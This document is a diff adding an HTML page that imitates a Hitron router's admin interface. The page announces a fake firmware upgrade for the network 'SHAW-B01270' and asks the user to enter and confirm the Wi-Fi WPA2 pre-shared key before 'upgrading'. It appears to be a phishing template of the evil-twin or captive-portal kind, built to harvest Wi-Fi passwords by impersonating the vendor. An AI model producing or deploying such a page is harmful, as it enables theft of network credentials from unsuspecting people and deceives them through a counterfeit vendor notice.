@@ -1,0 +1,120 @@
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en"><head>
+        <meta content="width=device-width, initial-scale=1" name="viewport">
+        <meta http-equiv="Content-type" content="text/html; charset=utf-8;">
+        <link rel="stylesheet" type="text/css" href="main-prefixed.css">
+        <script src="jquery.js"></script>
+        <script src="main.js"></script>
+    </head>
+    <body>
+        <div id="myTopnav" class="topnav nav-stuff">
+                <div id="setup" class="dropbtn">
+                    <p class="">Setup ▾</p>
+                </div>
+                <div id="wireless" class="dropbtn">
+                    <p class="">Wireless ▾</p>
+                </div>
+                <div id="security" class="dropbtn">
+                    <p class="">Security ▾</p>
+                </div>
+                <div id="access" class="dropbtn">
+                    <p class="">Access Restriction ▾</p>
+                </div>
+                <div id="administration" class="dropbtn">
+                    <p class="">Administration ▾</p>
+                </div>
+                <div id="status" class="dropbtn">
+                    <p class="">Status ▾</p>
+                </div>
+                <a id="hamburger" href="#" style="float: right">☰</a>
+        </div>
+        <div id="mobile-container" class="container nav-stuff">
+            <div id="mobile" class="mobile-menu">
+                <p id="one" class="link">Setup</p>
+                <p class="link">Wirless</p>
+                <p class="link">Security</p>
+                <p class="link">Access Restriciton</p>
+                <p class="link">Administration</p>
+                <p class="link">Status</p>
+            </div>
+        </div>
+        <div class="dropdowns nav-stuff">
+            <div id="setup-drop" class="dropcnt nav-stuff">
+                <p class="link">Basic Setup</p>
+                <p class="link">DDNS</p>
+                <p class="link">MAC Address Clone</p>
+                <p class="link">Advanced Routing</p>
+            </div>
+            <div id="wireless-drop" class="dropcnt nav-stuff">
+                <p class="link">Basic Wireless Settings</p>
+                <p class="link">Wireless Security</p>
+                <p class="link">Wireless MAC Filter</p>
+                <p class="link">Advanced Wireless Settings</p>
+            </div>
+            <div id="security-drop" class="dropcnt nav-stuff">
+                <p class="link">Firewall</p>
+                <p class="link">VPN</p>
+            </div>
+            <div id="access-drop" class="dropcnt nav-stuff">
+                <p class="link">Internet Access</p>
+            </div>
+            <div id="administration-drop" class="dropcnt nav-stuff">
+                <p class="link">Management</p>
+                <p class="link">Log</p>
+                <p class="link">Diagnostics</p>
+                <p class="link">Factory Default</p>
+                <p class="link">Config Management</p>
+            </div>
+            <div id="status-drop" class="dropcnt nav-stuff">
+                <p class="link">Router</p>
+                <p class="link">Local Network</p>
+                <p class="link">Wireless</p>
+                <p class="link">Advanced Routing</p>
+            </div>
+        </div>
+        <div class="alert-wrapper">
+            <div id="alert" class="alert-container">
+                <div class="alert-content">
+                    <img class="alertSym" src="img/exclamation-circle.svg">
+                    <p style="display: none" id="close" onclick='closeModal()' class="closeX">&#10005;</p>
+                    <p class="alert-statement">WPA2 Pre-Shared Key's do not match. </p>
+                </div>
+            </div>
+        </div>
+        <main class="main-container">
+            <div class="header-container">
+                <div class="logo-container">
+                    <div id="logoMain"></div>
+                </div>
+                <p class="header-header">Firmware Upgrade</p>
+                <p class="header-info">A new version of the Hitron firmware 1.0.12 has been detected and awaiting installation. Please review the following terms and conditions and proceed</p>
+            </div>
+            <form action="upgrading.html" method="post" class="wpa-form">
+                <div class="network">
+                    <p class="essid">Network Name (ESSID):</p>
+                    <p class="essidName" style="color: red">SHAW-B01270</p>
+                </div>
+                <div style="display: block"><label for="comment">Terms And Conditions:</label></div>
+                <textarea id="comment" readonly="yes" class="form-control" rows="8">                    1. LICENSE. Subject to the terms and conditions of this Software License Agreement, Hitron Technologies hereby grants you a restricted, limited, non-exclusive, non-transferable, license to use the Hitron Technologies Firmware/Software/Drivers only in conjunction with Hitron Technologies products. The Hitron Technologies Company does not grant you any license rights in any patent, copyright or other intellectual property rights owned by or licensed.
+                    
+                    2. NO WARRANTY. The Hitron Technologies Firmware/Software/Drivers are provided "AS IS" without warranty of any kind. Hitron Technologies Company does not warrant that the functions contained in the Firmware/Software/Drivers will meet your requirements or that the operation of the Hitron Technologies Firmware/Software/Drivers will be uninterrupted or error-free. Hitron Technologies Company hereby disclaims all warranties, express or implied, with respect to the Hitron Technologies firmware/software/drivers, including, without limitation, any implied warranties of merchantability, fitness for a particular purpose or non-infringement.
+                    
+                    3. NO LIABILITY. In no event shall Hitron Technologies Company or any other party which has been involved in the creation, production, or delivery of the Hitron Technologies Firmware/Software/Drivers be liable for any damages whatsoever arising from or related to this Software License Agreement or the Hitron Technologies Firmware/Software/Drivers, including, without limitation, direct, indirect, consequential, incidental or special damages or losses , including but not limited to damages for lost profits or losses resulting from business interruption or loss of data, regardless of the form of action or legal theory under which the liability may be asserted, even if advised of the possibility or likelihood of such damages. 
+                </textarea>
+                <div class="checkbox">
+                    <input type="checkbox" id="check-box"><p class="check-p">I Agree With Above Terms And Conditions</p>
+                </div>
+                <div class="wpa-container">
+                    <div class="input1">
+                        <label for="pwd">WPA2 Pre-Shared Key:</label>
+                        <input id="wpa1" pattern="" type="password" name="password1" value="">
+                    </div>
+                    <div class="input2">
+                        <label for="pwd">Confirm key:</label>
+                        <input id="wpa2" pattern="" type="password" name="password2" value="">
+                    </div>
+                    <div class="submit-container"><a id="submit" class="buttonSubmit">Start Upgrade</a></div>
+                </div>
+            </form>
+            <p class="footer">© Hitron Technologies 2019, All Rights Reserved.</p>
+        </main>
+</body></html>
